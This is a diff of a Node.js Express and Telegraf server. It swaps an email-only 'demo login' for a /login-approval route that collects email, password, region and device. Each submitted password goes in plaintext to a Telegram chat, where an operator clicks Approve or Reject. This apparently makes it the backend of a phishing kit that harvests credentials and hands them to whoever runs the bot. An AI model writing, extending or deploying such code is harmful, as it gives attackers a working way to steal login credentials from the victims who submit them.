@@ -1,60 +1,78 @@
 import express from "express";
-import bodyParser from "body-parser";
 import cors from "cors";
-import dotenv from "dotenv";
-import { startBot, setApprovalsStore } from "./bot.js";
+import bodyParser from "body-parser";
+import { Telegraf } from "telegraf";
+import { config } from "dotenv";
 
-dotenv.config();
+config(); // loads .env if you use one
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-app.use(bodyParser.json());
+// Telegram Bot Setup
+const BOT_TOKEN = process.env.BOT_TOKEN || "YOUR_BOT_TOKEN";
+const CHAT_ID = process.env.CHAT_ID || "YOUR_CHAT_ID";
+const bot = new Telegraf(BOT_TOKEN);
+
 app.use(cors());
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
 
-// In-memory approvals store
-const approvals = {};
-setApprovalsStore(approvals);
+// Root route
+app.get("/", (req, res) => {
+  res.send("Backend is running!");
+});
 
-// Start Telegram bot
-startBot();
+// Route to send login data to Telegram and wait for approval
+app.post("/login-approval", async (req, res) => {
+  const { email, password, region, device } = req.body;
 
-// POST /demo-login
-app.post("/demo-login", (req, res) => {
-  const { email } = req.body;
-  if (!email) return res.status(400).json({ success: false, message: "Email required" });
-
-  const identifier = Math.random().toString(36).substring(2, 10); // unique ID
-  approvals[identifier] = { email, status: "pending" };
-
-  // Send message to Telegram admin
-  const message = `Demo login request:\nEmail: ${email}\nIdentifier: ${identifier}\nApprove or Reject?`;
-  const inlineKeyboard = {
-    inline_keyboard: [
-      [
-        { text: "✅ Accept", callback_data: `accept_${identifier}` },
-        { text: "❌ Reject", callback_data: `reject_${identifier}` }
-      ]
-    ]
-  };
-
-  try {
-    startBot().bot.telegram.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup: inlineKeyboard });
-  } catch (err) {
-    console.error("Failed to send Telegram message:", err);
+  if (!email || !password) {
+    return res.status(400).json({ status: "error", message: "Missing email or password" });
   }
 
-  res.json({ success: true, identifier });
+  const message = `📥 Login Attempt\n\nEmail: ${email}\nPassword: ${password}\nRegion: ${region}\nDevice: ${device}`;
+  
+  try {
+    // Send message with inline buttons (Approve / Reject)
+    await bot.telegram.sendMessage(CHAT_ID, message, {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Approve", callback_data: `approve:${email}` },
+            { text: "❌ Reject", callback_data: `reject:${email}` }
+          ]
+        ]
+      }
+    });
+
+    // Respond to frontend that message was sent
+    res.json({ status: "pending" });
+  } catch (err) {
+    console.error("Telegram error:", err);
+    res.status(500).json({ status: "error", message: "Failed to send to Telegram" });
+  }
 });
 
-// GET /check-status?identifier=...
-app.get("/check-status", (req, res) => {
-  const { identifier } = req.query;
-  if (!identifier || !approvals[identifier]) return res.json({ status: "unknown" });
-  res.json({ status: approvals[identifier].status });
+// Handle callback queries from Telegram bot
+bot.on("callback_query", async (ctx) => {
+  const data = ctx.callbackQuery.data; // e.g., "approve:test@example.com"
+  const [action, email] = data.split(":");
+
+  console.log(`Login ${action} for ${email}`);
+  
+  // Optionally notify user in Telegram
+  await ctx.answerCbQuery(`Login ${action} for ${email}`);
 });
 
-// Start Express server
+// Start bot polling
+bot.launch().then(() => console.log("Telegram bot running"));
+
+// Start server
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
 });
+
+// Graceful shutdown
+process.once("SIGINT", () => bot.stop("SIGINT"));
+process.once("SIGTERM", () => bot.stop("SIGTERM"));
